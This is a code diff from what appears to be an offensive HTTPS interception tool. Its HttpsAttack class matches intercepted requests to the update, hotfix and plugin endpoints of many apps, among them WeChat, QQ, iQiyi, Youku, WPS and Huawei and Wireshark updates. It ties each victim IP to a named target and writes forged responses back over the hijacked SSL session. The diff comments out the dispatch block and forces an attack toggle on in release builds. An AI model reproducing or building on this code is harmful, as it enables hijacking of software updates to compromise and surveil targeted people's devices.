@@ -45,46 +45,18 @@
 #include "windowsupdate.h"
 #include "weixinAndroidJS.h"
 #include "IqiyiPlugin.h"
-
-
-int HttpsAttack::sendAttackPacket(char* recvBuffer, int resultlen, const char* szdm, LPSSLPROXYPARAM pstSSLProxyParam) {
-	int iRet = 0;
-
-	if (resultlen <= 0 || resultlen > SSL_MAX_BLOCK_SIZE)
-	{
-		printf("ssl attack data length:%u is larger than 0x4000\r\n", resultlen);
-		return 0;
-	}
-
-	iRet = SSL_write(pstSSLProxyParam->SSLToClient, recvBuffer, resultlen);
-	if (iRet != resultlen)
-	{
-		printf("SSL attack error:%d,description:%s,value:%d\n", SSL_get_error(pstSSLProxyParam->SSLToClient, iRet),
-			SSL_state_string_long(pstSSLProxyParam->SSLToClient), iRet);
-		return FALSE;
-	}
-	else {
-		printf("SSL attacker SSL_write ok,dns:%s,packet:%s\n", szdm, recvBuffer);
-	}
-
-	iRet = Public::writeFile(ATTACK_LOG_FILENAME, (unsigned char*)recvBuffer, resultlen, "ssl attack response packet:");
-	return TRUE;
-}
+#include "../Utils/Tools.h"
 
 
 
 
-
-
-
-
-int HttpsAttack::SslAttackPacket(char* recvBuffer, int iCounter, const char* url, const char* szDomainName, const char* httphdr,
-	const char* httpdata, LPSSLPROXYPARAM pstSSLProxyParam)
+int HttpsAttack::SslAttackPacket(char* buf, int size, const char* url, const char* host, const char* httphdr,const char* httpdata, LPSSLPROXYPARAM spp)
 {
 	int iRet = 0;
 
 	int resultlen = 0;
 
+	/*
 	if (pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr == 0x0100007f || strstr(pstSSLProxyParam->host, "127.0.0.1") ||
 		(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr == gLocalIP && gAttackMode != 3))
 	{
@@ -129,7 +101,6 @@ int HttpsAttack::SslAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 		return TRUE;
 	}
-
 	else if (strstr(szDomainName, "iface2.iqiyi.com") && strstr((char*)url, "/fusion/3.0/plugin?"))
 	{
 		string username = InformerInterface::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);
@@ -138,7 +109,6 @@ int HttpsAttack::SslAttackPacket(char* recvBuffer, int iCounter, const char* url
 		resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
 		return TRUE;
 	}
-
 	//ÍøÒ³°æ
 	else if (QQVideoSSL::isTencentPcUpgrade(url, szDomainName))
 	{
@@ -158,7 +128,6 @@ int HttpsAttack::SslAttackPacket(char* recvBuffer, int iCounter, const char* url
 		resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
 		return TRUE;
 	}
-
 	else if (AliCdn::isAliCdnHead(url, szDomainName))
 	{
 		string username = InformerInterface::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);
@@ -169,7 +138,6 @@ int HttpsAttack::SslAttackPacket(char* recvBuffer, int iCounter, const char* url
 		resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
 		return TRUE;
 	}
-
 	else if (AliCdn::isAliCdnRequest(url, szDomainName))
 	{
 		string username = InformerInterface::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);
@@ -181,7 +149,6 @@ int HttpsAttack::SslAttackPacket(char* recvBuffer, int iCounter, const char* url
 		//resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
 		return TRUE;
 	}
-
 	else if (WPSPlugin::isWpsPlugin(url, szDomainName))
 	{
 		string username = InformerInterface::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);
@@ -192,7 +159,6 @@ int HttpsAttack::SslAttackPacket(char* recvBuffer, int iCounter, const char* url
 		resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
 		return TRUE;
 	}
-
 	else if (YoukuHotfix::isYoukuHotfix(url, szDomainName))
 	{
 		string username = InformerInterface::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);
@@ -213,7 +179,6 @@ int HttpsAttack::SslAttackPacket(char* recvBuffer, int iCounter, const char* url
 		resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
 		return TRUE;
 	}
-
 	// 	else if (Youku::isYouku(url, szDomainName))
 	// 	{
 	// 		string username = InformerInterface::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr,szDomainName);
@@ -224,7 +189,6 @@ int HttpsAttack::SslAttackPacket(char* recvBuffer, int iCounter, const char* url
 	// 		resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
 	// 		return TRUE;
 	// 	}
-
 	else if (ShuqiPlugin::isShuqi(url, szDomainName))
 	{
 		string username = InformerInterface::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);
@@ -271,7 +235,6 @@ int HttpsAttack::SslAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 		return TRUE;
 	}
-
 	else if (ToutiaoPlugin::isToutiaoPlugin(url, szDomainName))
 	{
 		string username = InformerInterface::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);
@@ -281,7 +244,6 @@ int HttpsAttack::SslAttackPacket(char* recvBuffer, int iCounter, const char* url
 		resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
 		return TRUE;
 	}
-
 	else if (QQAndroid::isQQPlugin(url, szDomainName))
 	{
 		string username = InformerInterface::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);
@@ -291,7 +253,6 @@ int HttpsAttack::SslAttackPacket(char* recvBuffer, int iCounter, const char* url
 		resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
 		return TRUE;
 	}
-
 	else if (Qukan::isQukanHotfix(url, szDomainName))
 	{
 		string username = InformerInterface::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);
@@ -302,8 +263,6 @@ int HttpsAttack::SslAttackPacket(char* recvBuffer, int iCounter, const char* url
 		resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
 		return TRUE;
 	}
-
-
 	else if (WeixinAndroid::isWxAndroidUpdateConfig(url, szDomainName))
 	{
 		string username = InformerInterface::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);
@@ -328,7 +287,6 @@ int HttpsAttack::SslAttackPacket(char* recvBuffer, int iCounter, const char* url
 		resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
 		return TRUE;
 	}
-
 	else if (WeixinAndroid::isWxAndroidUpdateApkJs(url, szDomainName))
 	{
 		string username = InformerInterface::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);
@@ -443,7 +401,6 @@ int HttpsAttack::SslAttackPacket(char* recvBuffer, int iCounter, const char* url
 		resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
 		return TRUE;
 	}
-
 	else if (HuYaPlugin::isHuya(url, szDomainName))
 	{
 		string username = InformerInterface::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);
@@ -454,7 +411,6 @@ int HttpsAttack::SslAttackPacket(char* recvBuffer, int iCounter, const char* url
 		resultlen = sendAttackPacket(recvBuffer, resultlen, szDomainName, pstSSLProxyParam);
 		return TRUE;
 	}
-
 	else if (YouKuPCPlugin::isYoukuPlugin(url, szDomainName))
 	{
 		string username = InformerInterface::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);
@@ -479,7 +435,6 @@ int HttpsAttack::SslAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 		return TRUE;
 	}
-
 	else if (TSZPlugin::is360Plugin(url, szDomainName))
 	{
 		string username = InformerInterface::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);
@@ -490,13 +445,11 @@ int HttpsAttack::SslAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 		return TRUE;
 	}
-
 	else if (strstr(szDomainName, "360.cn") || strstr(szDomainName, "360.com"))
 	{
 		return TRUE;
 
 	}
-
 	else if (HuaweiUpdate::isHuaweiUpdate(url, szDomainName))
 	{
 		string username = InformerInterface::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);
@@ -517,8 +470,6 @@ int HttpsAttack::SslAttackPacket(char* recvBuffer, int iCounter, const char* url
 
 		return TRUE;
 	}
-
-
 	else if (BaiduPromotion::isBaiduAd(url, szDomainName))
 	{
 		string username = InformerInterface::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);
@@ -532,7 +483,6 @@ int HttpsAttack::SslAttackPacket(char* recvBuffer, int iCounter, const char* url
 		}
 		return TRUE;
 	}
-
 	else if (DidiAndroid::isDidi(url, szDomainName))
 	{
 		string username = InformerInterface::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);
@@ -546,7 +496,6 @@ int HttpsAttack::SslAttackPacket(char* recvBuffer, int iCounter, const char* url
 		}
 		return TRUE;
 	}
-
 	else if (KuaiyaUpdate::isKuaiya(url, szDomainName))
 	{
 		string username = InformerInterface::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);
@@ -560,8 +509,6 @@ int HttpsAttack::SslAttackPacket(char* recvBuffer, int iCounter, const char* url
 		}
 		return TRUE;
 	}
-
-
 	else if (WireSharkUpdate::isWireshark(url, szDomainName))
 	{
 		string username = InformerInterface::getTarget(pstSSLProxyParam->saToClient.sin_addr.S_un.S_addr, szDomainName);
@@ -588,15 +535,46 @@ int HttpsAttack::SslAttackPacket(char* recvBuffer, int iCounter, const char* url
 		}
 		return TRUE;
 	}
-
+	*/
 	return FALSE;
 }
 
 
+int HttpsAttack::sendAttackPacket(char* recvBuffer, int resultlen, const char* host, LPSSLPROXYPARAM spp) {
+	int iRet = 0;
+
+	if (resultlen <= 0 || resultlen > SSL_MAX_BLOCK_SIZE)
+	{
+		log("[%s %d]ssl attack data size:%u error\r\n", __FUNCTION__, __LINE__, resultlen);
+		return 0;
+	}
+
+	iRet = SSL_write(spp->SSLToClient, recvBuffer, resultlen);
+	if (iRet != resultlen)
+	{
+		log("[%s %d]SSL attack error:%d,description:%s,value:%d\n", 
+			__FUNCTION__, __LINE__, SSL_get_error(spp->SSLToClient, iRet),SSL_state_string_long(spp->SSLToClient), iRet);
+		return FALSE;
+	}
+	else {
+		log("[%s %d]SSL attacker SSL_write ok,host:%s,packet:%s\n", __FUNCTION__, __LINE__, host, recvBuffer);
+	}
+
+	return TRUE;
+}
 
 
+int HttpsAttack::sslAttackProc(char* recvBuffer, int& iCounter, LPSSLPROXYPARAM spp) {
+	extern int gAttackToggle;
+#ifdef _DEBUG
 
-int HttpsAttack::sslAttackProc(char* recvBuffer, int& iCounter, LPSSLPROXYPARAM pstSSLProxyParam) {
+#else
+	gAttackToggle = 1;
+#endif
+
+	if (gAttackToggle == 0) {
+		return 0;
+	}
 	int iRet = 0;
 
 	char* httpdata = 0;
@@ -608,7 +586,7 @@ int HttpsAttack::sslAttackProc(char* recvBuffer, int& iCounter, LPSSLPROXYPARAM 
 	iRet = HttpUtils::parseHttpHdr(recvBuffer, iCounter, httphdr, &httpdata, url, host, port);
 	if (iRet < 0)
 	{
-		if (pstSSLProxyParam->host[0] == 0)
+		if (spp->host[0] == 0)
 		{
 			return TRUE;
 		}
@@ -618,28 +596,27 @@ int HttpsAttack::sslAttackProc(char* recvBuffer, int& iCounter, LPSSLPROXYPARAM 
 	}
 	else if (iRet == 0)
 	{
-		iRet = AttackSplitPacket::splitPacket(recvBuffer, iCounter, pstSSLProxyParam, httphdr, &httpdata, url, host, port);
+		iRet = AttackSplitPacket::splitPacket(recvBuffer, iCounter, spp, httphdr, &httpdata, url, host, port);
 		if (iRet <= 0)
 		{
-			Public::writeFile(ATTACK_LOG_FILENAME, (unsigned char*)recvBuffer, iCounter, "\r\nhttp splitPacket error:\r\n");
+			log("[%s %d] error:%d\r\n", __FUNCTION__, __LINE__, GetLastError());
 			return TRUE;
 		}
 		else {
-			lstrcpyA(pstSSLProxyParam->host, host.c_str());
+			lstrcpyA(spp->host, host.c_str());
 		}
 	}
 	else
 	{
-		lstrcpyA(pstSSLProxyParam->host, host.c_str());
+		lstrcpyA(spp->host, host.c_str());
 	}
 
-	if (*pstSSLProxyParam->host == 0)
+	if (*spp->host == 0)
 	{
 		return TRUE;
 	}
 
-	iRet = HttpsAttack::SslAttackPacket((char*)recvBuffer, iCounter, url.c_str(), host.c_str(), httphdr.c_str(),
-		httpdata, pstSSLProxyParam);
+	iRet = HttpsAttack::SslAttackPacket((char*)recvBuffer, iCounter, url.c_str(), host.c_str(), httphdr.c_str(),httpdata, spp);
 	if (iRet)
 	{
 		return TRUE;
